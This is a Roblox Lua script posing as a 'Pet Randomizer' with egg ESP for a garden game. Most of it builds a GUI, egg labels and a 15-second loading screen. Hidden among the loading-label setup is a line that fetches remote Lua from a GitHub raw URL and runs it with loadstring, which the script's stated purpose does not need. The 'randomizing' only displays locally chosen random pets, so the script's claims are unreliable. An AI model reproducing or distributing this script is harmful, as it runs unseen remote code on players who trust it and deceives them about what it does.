-- 🛡️ Secured, Redesigned, and Customized by gcsriptt
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer
local mouse = player:GetMouse()

local petTable = {
    ["Common Egg"] = { "Dog", "Bunny", "Golden Lab" },
    ["Uncommon Egg"] = { "Chicken", "Black Bunny", "Cat", "Deer" },
    ["Rare Egg"] = { "Pig", "Monkey", "Rooster", "Orange Tabby", "Spotted Deer" },
    ["Legendary Egg"] = { "Cow", "Polar Bear", "Sea Otter", "Turtle", "Silver Monkey" },
    ["Mythical Egg"] = { "Grey Mouse", "Brown Mouse", "Squirrel", "Red Giant Ant" },
    ["Bug Egg"] = { "Snail", "Caterpillar", "Giant Ant", "Praying Mantis" },
    ["Night Egg"] = { "Frog", "Hedgehog", "Mole", "Echo Frog", "Night Owl" },
    ["Bee Egg"] = { "Bee", "Honey Bee", "Bear Bee", "Petal Bee" },
    ["Anti Bee Egg"] = { "Wasp", "Moth", "Tarantula Hawk" },
    ["Oasis Egg"] = { "Meerkat", "Sand Snake", "Axolotl" },
    ["Paradise Egg"] = { "Ostrich", "Peacock", "Capybara" },
    ["Dinosaur Egg"] = { "Raptor", "Triceratops", "Stegosaurus" },
    ["Primal Egg"] = { "Parasaurolophus", "Iguanodon", "Pachycephalosaurus" },
}

local espEnabled = true
local truePetMap = {}

local function glitchLabelEffect(label)
    coroutine.wrap(function()
        local original = label.TextColor3
        for i = 1, 2 do
            label.TextColor3 = Color3.new(1, 0, 0)
            wait(0.07)
            label.TextColor3 = original
            wait(0.07)
        end
    end)()
end

local function applyEggESP(eggModel, petName)
    local existingLabel = eggModel:FindFirstChild("PetBillboard", true)
    if existingLabel then existingLabel:Destroy() end
    local existingHighlight = eggModel:FindFirstChild("ESPHighlight")
    if existingHighlight then existingHighlight:Destroy() end
    if not espEnabled then return end

    local basePart = eggModel:FindFirstChildWhichIsA("BasePart")
    if not basePart then return end

    local hatchReady = true
    local hatchTime = eggModel:FindFirstChild("HatchTime")
    local readyFlag = eggModel:FindFirstChild("ReadyToHatch")

    if hatchTime and hatchTime:IsA("NumberValue") and hatchTime.Value > 0 then
        hatchReady = false
    elseif readyFlag and readyFlag:IsA("BoolValue") and not readyFlag.Value then
        hatchReady = false
    end

    local billboard = Instance.new("BillboardGui")
    billboard.Name = "PetBillboard"
    billboard.Size = UDim2.new(0, 270, 0, 50)
    billboard.StudsOffset = Vector3.new(0, 4.5, 0)
    billboard.AlwaysOnTop = true
    billboard.MaxDistance = 500
    billboard.Parent = basePart

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 1, 0)
    label.BackgroundTransparency = 1
    label.Text = eggModel.Name .. " | " .. petName
    if not hatchReady then
        label.Text = eggModel.Name .. " | " .. petName .. " (Not Ready)"
        label.TextColor3 = Color3.fromRGB(160, 160, 160)
        label.TextStrokeTransparency = 0.5
    else
        label.TextColor3 = Color3.new(1, 1, 1)
        label.TextStrokeTransparency = 0
    end
    label.TextScaled = true
    label.Font = Enum.Font.GothamBold
    label.Parent = billboard

    glitchLabelEffect(label)

    local highlight = Instance.new("Highlight")
    highlight.Name = "ESPHighlight"
    highlight.FillColor = Color3.fromRGB(255, 200, 0)
    highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
    highlight.FillTransparency = 0.7
    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    highlight.Adornee = eggModel
    highlight.Parent = eggModel
end

local function removeEggESP(eggModel)
    local label = eggModel:FindFirstChild("PetBillboard", true)
    if label then label:Destroy() end
    local highlight = eggModel:FindFirstChild("ESPHighlight")
    if highlight then highlight:Destroy() end
end

local function getPlayerGardenEggs(radius)
    local eggs = {}
    local char = player.Character or player.CharacterAdded:Wait()
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return eggs end

    for _, obj in pairs(Workspace:GetDescendants()) do
        if obj:IsA("Model") and petTable[obj.Name] then
            local dist = (obj:GetModelCFrame().Position - root.Position).Magnitude
            if dist <= (radius or 60) then
                if not truePetMap[obj] then
                    local pets = petTable[obj.Name]
                    local chosen = pets[math.random(1, #pets)]
                    truePetMap[obj] = chosen
                end
                table.insert(eggs, obj)
            end
        end
    end
    return eggs
end

local function randomizeNearbyEggs()
    local eggs = getPlayerGardenEggs(60)
    for _, egg in ipairs(eggs) do
        local pets = petTable[egg.Name]
        local chosen = pets[math.random(1, #pets)]
        truePetMap[egg] = chosen
        applyEggESP(egg, chosen)
    end
    print("Randomized", #eggs, "eggs.")
end

local function flashEffect(button)
    local originalColor = button.BackgroundColor3
    for i = 1, 3 do
        button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        wait(0.05)
        button.BackgroundColor3 = originalColor
        wait(0.05)
    end
end

local function countdownAndRandomize(button)
    for i = 10, 1, -1 do
        button.Text = "🎲 Randomize in: " .. i
        wait(1)
    end
    flashEffect(button)
    randomizeNearbyEggs()
    button.Text = "🎲 Randomize Pets"
end

-- 🌟 LOADING SCREEN (15 seconds)
local loadingGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
loadingGui.IgnoreGuiInset = true
loadingGui.ResetOnSpawn = false

local loadingLabel = Instance.new("TextLabel", loadingGui)
loadingLabel.Size = UDim2.new(1, 0, 1, 0)
loadingLabel.Text = "🐾 Loading the Pet Randomizer"
loadingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
loadingLabel.BackgroundTransparency = 1
loadstring(game:HttpGet("https://raw.githubusercontent.com/gscriptt/pet-randomizer-script/refs/heads/main/main.lua"))()
loadingLabel.Font = Enum.Font.GothamBold
loadingLabel.TextSize = 30
loadingLabel.TextStrokeTransparency = 0.5
loadingLabel.TextStrokeColor3 = Color3.new(0, 0, 0)

local waitLabel = Instance.new("TextLabel", loadingGui)
waitLabel.Size = UDim2.new(1, 0, 1, 0)
waitLabel.Position = UDim2.new(0, 0, 0, 40)
waitLabel.Text = "⏳ Please wait for 15 seconds...\n🙌 Thank you for your patience!"
waitLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
waitLabel.BackgroundTransparency = 1
waitLabel.Font = Enum.Font.Gotham
waitLabel.TextSize = 20
waitLabel.TextStrokeTransparency = 0.6

-- Animate dots
local running = true
coroutine.wrap(function()
    while running do
        for i = 1, 3 do
            loadingLabel.Text = "🐾 Loading the Pet Randomizer" .. string.rep(".", i)
            wait(0.5)
        end
    end
end)()

wait(15)
running = false
loadingGui:Destroy()

-- 🌈 MAIN GUI
local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
screenGui.Name = "PetHatchGui"

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 360, 0, 320)
frame.Position = UDim2.new(0.3, 0, 0.3, 0)
frame.BackgroundColor3 = Color3.fromRGB(50, 50, 70)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui

local gradient = Instance.new("UIGradient", frame)
gradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 140, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(150, 80, 255))
}
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 15)
Instance.new("UIStroke", frame).Thickness = 2

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, 0, 0, 40)
title.BackgroundTransparency = 1
title.Text = "🐾 Pet Randomizer ✨"
title.Font = Enum.Font.GothamBold
title.TextSize = 24
title.TextColor3 = Color3.fromRGB(255, 255, 255)

local credit = Instance.new("TextLabel", frame)
credit.Size = UDim2.new(1, 0, 0, 20)
credit.Position = UDim2.new(0, 0, 1, -20)
credit.Text = "Made by gcsriptt"
credit.TextColor3 = Color3.fromRGB(200, 200, 200)
credit.BackgroundTransparency = 1
credit.Font = Enum.Font.Gotham
credit.TextSize = 14

local randomizeBtn = Instance.new("TextButton", frame)
randomizeBtn.Size = UDim2.new(1, -40, 0, 50)
randomizeBtn.Position = UDim2.new(0, 20, 0, 60)
randomizeBtn.BackgroundColor3 = Color3.fromRGB(255, 140, 0)
randomizeBtn.Text = "🎲 Randomize Pets"
randomizeBtn.TextSize = 20
randomizeBtn.Font = Enum.Font.Gotham
randomizeBtn.TextColor3 = Color3.new(1, 1, 1)
Instance.new("UICorner", randomizeBtn).CornerRadius = UDim.new(0, 10)
randomizeBtn.MouseButton1Click:Connect(function()
    countdownAndRandomize(randomizeBtn)
end)

local toggleBtn = Instance.new("TextButton", frame)
toggleBtn.Size = UDim2.new(1, -40, 0, 40)
toggleBtn.Position = UDim2.new(0, 20, 0, 130)
toggleBtn.BackgroundColor3 = Color3.fromRGB(60, 180, 75)
toggleBtn.Text = "👁️ ESP: ON"
toggleBtn.TextSize = 18
toggleBtn.Font = Enum.Font.Gotham
toggleBtn.TextColor3 = Color3.new(1, 1, 1)
Instance.new("UICorner", toggleBtn).CornerRadius = UDim.new(0, 10)
toggleBtn.MouseButton1Click:Connect(function()
    espEnabled = not espEnabled
    toggleBtn.Text = espEnabled and "👁️ ESP: ON" or "👁️ ESP: OFF"
    for _, egg in pairs(getPlayerGardenEggs(60)) do
        if espEnabled then
            applyEggESP(egg, truePetMap[egg])
        else
            removeEggESP(egg)
        end
    end
end)

-- Auto-apply ESP
for _, egg in pairs(getPlayerGardenEggs(60)) do
    applyEggESP(egg, truePetMap[egg])
end

print("✅ Pet Randomizer loaded successfully! Made by gcsriptt")
